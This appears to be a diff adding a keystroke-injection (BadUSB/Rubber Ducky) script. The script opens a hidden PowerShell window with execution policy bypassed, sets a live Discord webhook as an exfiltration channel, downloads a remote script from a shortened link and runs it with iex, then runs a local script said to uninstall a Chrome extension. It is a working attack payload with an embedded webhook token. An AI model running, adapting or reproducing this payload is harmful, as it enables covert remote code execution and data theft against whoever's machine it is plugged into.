@@ -1,0 +1,11 @@
+﻿REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1230529256149487718/MB51JxuJ5CVVDjmPaYuWD88_kNiDOERV_cRqJUPQCuDlGQZ3-F4nrgwKjmrgy-lEBiSb'; irm https://t.ly/rJl5k | iex
+ENTER
+
+REM Call the PowerShell script to uninstall Chrome extension
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass -File "$(Join-Path -Path $PSScriptRoot -ChildPath 'KODE2.ps1')"
+ENTER
